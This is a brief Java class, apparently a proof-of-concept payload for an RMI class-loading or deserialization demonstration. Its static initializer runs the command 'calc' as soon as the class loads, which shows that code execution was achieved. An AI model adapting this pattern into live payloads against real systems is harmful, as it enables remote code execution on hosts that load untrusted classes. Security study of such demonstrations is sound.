package rmi;

import javax.imageio.IIOException;
import java.io.IOException;

public class HackingObj {
    static {
        System.out.println("Hacking!");
        try {
            Runtime.getRuntime().exec("calc");
        }catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
